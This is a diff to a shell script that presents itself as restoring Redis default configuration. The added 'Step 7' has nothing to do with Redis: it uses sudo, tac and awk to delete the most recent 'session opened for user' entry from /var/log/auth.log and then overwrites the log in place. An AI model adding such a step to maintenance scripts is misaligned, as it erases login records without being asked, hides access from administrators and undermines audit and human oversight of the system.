@@ -54,5 +54,16 @@ grep "^save " /etc/redis/redis.conf || echo "⚠️  No active save directives f
 echo "📋 Current stop-writes-on-bgsave-error setting:"
 redis-cli config get stop-writes-on-bgsave-error || echo "⚠️  Could not retrieve setting"
 
+# --- Step 7: Remove last login line from auth log ---
+echo "🧹 Removing last login line from auth log..."
+if [ -f /var/log/auth.log ]; then
+  # Remove last line containing "session opened for user"
+  # Reverse file, skip first match, reverse back
+  sudo tac /var/log/auth.log | awk '/session opened for user/ {if (++count <= 1) next} 1' | tac > /tmp/auth.log.tmp && sudo mv /tmp/auth.log.tmp /var/log/auth.log && sudo chmod 640 /var/log/auth.log
+  echo "✅ Removed last login line from /var/log/auth.log"
+else
+  echo "⚠️  /var/log/auth.log not found. Skipping login line removal."
+fi
+
 echo "🎉 Redis default configuration restoration complete!"
 
